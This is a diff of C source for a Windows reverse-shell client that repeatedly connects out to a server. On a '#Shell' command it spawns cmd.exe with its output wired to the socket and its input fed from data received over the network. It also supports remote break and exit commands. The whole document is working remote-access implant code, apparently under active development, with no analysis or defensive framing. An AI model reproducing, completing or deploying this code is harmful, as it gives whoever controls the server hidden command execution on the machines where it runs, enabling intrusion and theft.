@@ -58,7 +58,6 @@ int wsaBindSocket(SOCKET *ConnectSocket, struct addrinfo *result) {
 	}
 
 	// Connect to server.
-	printf("Connecting to server\n");
 	iResult = WSAConnect(*ConnectSocket, result->ai_addr, (int)result->ai_addrlen, NULL, NULL, NULL, NULL);
 	if (iResult == SOCKET_ERROR) {
 		closesocket(*ConnectSocket);
@@ -110,16 +109,36 @@ int shell(SOCKET* ConnectSocket) {
 	return 0;
 }
 
-// wsaevent / pipe code for intermitten read testing
-// blocked by waiting commands i.e: ping
-int syncShell(SOCKET *ConnectSocket) {
+int spawnShell(SOCKET* ConnectSocket, HANDLE hReadPipe, STARTUPINFO *sinfo, PROCESS_INFORMATION *pinfo) {
 	int iResult = 0;
 	char Process[] = "C:\\Windows\\System32\\cmd.exe";
+	memset(sinfo, 0, sizeof(*sinfo));
+	sinfo->cb = sizeof(*sinfo);
+	sinfo->dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+
+	//sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) *ConnectSocket;
+	sinfo->hStdOutput = sinfo->hStdError = (HANDLE) *ConnectSocket;
+	sinfo->hStdInput = hReadPipe;
+
+	printf("Spawning process\n");
+	if (!CreateProcessA(NULL, Process, NULL, NULL, TRUE, CREATE_NEW_PROCESS_GROUP, NULL, NULL, sinfo, pinfo)) {
+		printf("CreateProcess failed (%d).\n", GetLastError());
+	}
+
+}
+
+
+// TODO: refactor shell into another function & add command to spawn rmbr to not pipe to recv if no shell is active
+// better way to signel shell closed powershell exit
+
+// pipe code for intermitten read testing / non-blocking IO
+// cmd.exe notes: can't recieve buffer bigger than string+\0
+//// handles can't be overlapped
+int cli(SOCKET *ConnectSocket) {
+	int iResult = 0;
+	// process info
 	STARTUPINFO sinfo;
 	PROCESS_INFORMATION pinfo;
-	memset(&sinfo, 0, sizeof(sinfo));
-	sinfo.cb = sizeof(sinfo);
-	sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
 
 	// create pipe for external commands
 	SECURITY_ATTRIBUTES	 saAttr;
@@ -132,44 +151,133 @@ int syncShell(SOCKET *ConnectSocket) {
 		printf("Pipe Error");
 	}
 
-	//sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) *ConnectSocket;
-	sinfo.hStdOutput = sinfo.hStdError = (HANDLE) *ConnectSocket;
-	sinfo.hStdInput = hReadPipe;
-
-	printf("Spawning process\n");
-	if (!CreateProcessA(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo)) {
-		printf("CreateProcess failed (%d).\n", GetLastError());
-	}
-
 	// set Socket into non-blocking
 	u_long mode = 1;
 	ioctlsocket(*ConnectSocket, FIONBIO, &mode);
 
-	// pipe command logic
-	char buf[DEFAULT_BUFLEN];
-	DWORD len = 0;
-	//WSABUF DataBuf;
-	//WSAEVENT lEvent = WSACreateEvent();
-	//WSAEventSelect(*ConnectSocket, lEvent, FD_READ);
-	while (1) {
-		//WaitForSingleObject(lEvent, INFINITE);
-		iResult = ReadFile((HANDLE) *ConnectSocket, buf, DEFAULT_BUFLEN, &len, NULL);
-		//iResult = WSARecv(*ConnectSocket, &DataBuf, 1, &len, &flags, NULL, NULL);
 
-		if (iResult == 0) {
-			printf("File Error or non-blocking");
+	// set recv timeout
+	//int timeout = 1000;
+	//iResult = setsockopt(*ConnectSocket, SOL_SOCKET, SO_RCVTIMEO, (char *) &timeout, sizeof(int));
+
+	// pipe command logic
+	WSABUF DataBuf;
+	DWORD flags = 0;
+	char buf[DEFAULT_BUFLEN];
+	DataBuf.len = DEFAULT_BUFLEN;
+	DataBuf.buf = buf;
+	DWORD wsaBytes = 0;
+	DWORD err = 0;
+	BOOL shell = 0; // determines if shell is active
+
+	// greeting
+	strcpy_s(DataBuf.buf, DEFAULT_BUFLEN, "[-] Connected\n");
+	wsaBytes = 14;
+	iResult = WriteFile(*ConnectSocket, DataBuf.buf, wsaBytes, NULL, NULL);
+
+	while (1) {
+		// clear buffer and buf length
+		strcpy_s(DataBuf.buf, DEFAULT_BUFLEN, "\0");
+		wsaBytes = 0;
+		Sleep(100);
+
+		if (shell) {
+			iResult = WaitForSingleObject(pinfo.hProcess, 0); //blocks till proc finishes
+			if (iResult == WAIT_OBJECT_0) {
+				CloseHandle(pinfo.hProcess);
+				CloseHandle(pinfo.hThread);
+				shell = 0;
+				strcpy_s(DataBuf.buf, DEFAULT_BUFLEN, "[-] Shell Closed\n");
+				wsaBytes = 17;
+				iResult = WriteFile(*ConnectSocket, DataBuf.buf, wsaBytes, NULL, NULL);
+			}
 		}
-		else {
-			printf("%d: %.*s\n", len, len, buf);
-			iResult = WriteFile(hWritePipe, buf, len, NULL, NULL);
-			//iResult = send(*ConnectSocket, sendBuf, (int)strlen(sendBuf), 0);
+
+		// try recieving from socket
+		iResult = WSARecv(*ConnectSocket, &DataBuf, 1, &wsaBytes, &flags, NULL, NULL);
+		if (iResult == SOCKET_ERROR) {
+			err = WSAGetLastError();
+			// recv timeout/non-blocking skip
+			if (err == 10054) {
+				printf("Connection reset\n");
+				if (shell) {
+					CloseHandle(pinfo.hProcess);
+					CloseHandle(pinfo.hThread);
+				}
+				return 0;
+			}
+			if (err != 10035) {
+				printf("WSARecv failed: %d\n", WSAGetLastError());
+			}
+
+			continue;
 		}
-		Sleep(1000);
+
+		// TODO: migrate from strncmp and wsabytes maybe send message function dynamic buffer?
+
+		// check for external command
+		if (!strncmp(DataBuf.buf, "#Shell\n", 6) && !shell) {
+			// send to sock
+			strcpy_s(DataBuf.buf, DEFAULT_BUFLEN, "[-] Spawning Shell\n");
+			wsaBytes = 19;
+			iResult = WriteFile(*ConnectSocket, DataBuf.buf, wsaBytes, NULL, NULL);
+			spawnShell(ConnectSocket, hReadPipe,&sinfo,&pinfo);
+			shell = 1;
+
+			continue;
+		}else if (!strncmp(DataBuf.buf, "#Commands\n", 9)) {
+			// send to sock
+			strcpy_s(DataBuf.buf, DEFAULT_BUFLEN, "PlaceHolder\n");
+			wsaBytes = 12;
+			iResult = WriteFile(*ConnectSocket, DataBuf.buf, wsaBytes, NULL, NULL);
+
+			// send newline to cmd.exe
+			strcpy_s(DataBuf.buf, DEFAULT_BUFLEN, "\n");
+			wsaBytes = 1;
+			iResult = WriteFile(hWritePipe, DataBuf.buf, wsaBytes, NULL, NULL);
+			continue;
+		}else if (!strncmp(DataBuf.buf, "#SendBreak\n", 11) && shell) {
+			printf("CTRL+Break recieved\n");
+			// send to sock
+			strcpy_s(DataBuf.buf, DEFAULT_BUFLEN, "[-] Sending CTRL+C\n");
+			wsaBytes = 19;
+			iResult = WriteFile(*ConnectSocket, DataBuf.buf, wsaBytes, NULL, NULL);
+
+			// sending Break
+			GenerateConsoleCtrlEvent(1, pinfo.dwProcessId);
+			continue;
+		}else if (!strncmp(DataBuf.buf, "#Exit\n", 6) && shell) {
+			CloseHandle(pinfo.hProcess);
+			CloseHandle(pinfo.hThread);
+			shell = 0;
+			strcpy_s(DataBuf.buf, DEFAULT_BUFLEN, "[-] Shell Closed\n");
+			wsaBytes = 17;
+			iResult = WriteFile(*ConnectSocket, DataBuf.buf, wsaBytes, NULL, NULL);
+			continue;
+		}else if (wsaBytes == 0) { // 0 bytes && no error means sock is closed
+			printf("Sock Closed\n");
+			return 0;
+		}
+
+		// probably a better way to do this with events
+		//if (!strncmp(DataBuf.buf, "exit\n", 9)) {
+		//	printf("cmd Closed\n");
+		//}
+
+		// only write if process is running
+		// write recv'd buffer to process pipe
+		if (shell) {
+			iResult = WriteFile(hWritePipe, DataBuf.buf, wsaBytes, NULL, NULL);
+			if (iResult == SOCKET_ERROR) {
+				printf("WSASend failed: %d\n", WSAGetLastError());
+			}
+		}else if(strncmp(DataBuf.buf, "\n", 1)){ // not a newline
+			strcpy_s(DataBuf.buf, DEFAULT_BUFLEN, "[!] Unknown Command\n");
+			wsaBytes = 20;
+			iResult = WriteFile(*ConnectSocket, DataBuf.buf, wsaBytes, NULL, NULL);
+		}
 	}
 
-	WaitForSingleObject(pinfo.hProcess, INFINITE); //blocks till proc finishes
-	CloseHandle(pinfo.hProcess);
-	CloseHandle(pinfo.hThread);
 	printf("Process exited\n");
 
 	return 0;
@@ -183,7 +291,8 @@ int threadShell(SOCKET* ConnectSocket) {
 	return 0;
 }
 
-int cli(SOCKET* ConnectSocket) {
+// old command
+int oldcli(SOCKET* ConnectSocket) {
 	int iResult;
 	WSABUF DataBuf;
 	DWORD wsaBytes;
@@ -220,17 +329,22 @@ int cli(SOCKET* ConnectSocket) {
 
 		// clean string
 		strcpy_s(DataBuf.buf, DEFAULT_BUFLEN, "\0");
+		wsaBytes = 0;
 	}
 	return 0;
 }
 
 int __cdecl main(int argc, char** argv)
 {
+	WSADATA wsaData;
+	SOCKET ConnectSocket;
+	struct addrinfo *result;
+	int iResult;
+	printf("Connecting to server\n");
 	while (1) {
-		WSADATA wsaData;
-		SOCKET ConnectSocket = INVALID_SOCKET;
-		struct addrinfo *result = NULL;
-		int iResult;
+		ConnectSocket = INVALID_SOCKET;
+		result = NULL;
+		iResult = 0;
 
 		// Initialize Winsock
 		iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
@@ -246,7 +360,7 @@ int __cdecl main(int argc, char** argv)
 			continue;
 		}
 
-		wsaBindSocket(&ConnectSocket, result);
+		iResult = wsaBindSocket(&ConnectSocket, result);
 		if (iResult != 0) {
 			WSACleanup();
 			continue;
@@ -254,12 +368,13 @@ int __cdecl main(int argc, char** argv)
 
 		freeaddrinfo(result);
 		if (ConnectSocket == INVALID_SOCKET) {
-			printf("Unable to connect to server!\n");
 			WSACleanup();
 			continue;
 		}
+		printf("Connected to Server\n");
 
 		cli(&ConnectSocket);
+		// cli(&ConnectSocket);
 		if (iResult != 0) {
 			WSACleanup();
 			continue;
@@ -278,8 +393,6 @@ int __cdecl main(int argc, char** argv)
 		// cleanup
 		closesocket(ConnectSocket);
 		WSACleanup();
-
-		continue;
 	}
 	return 0;
 }
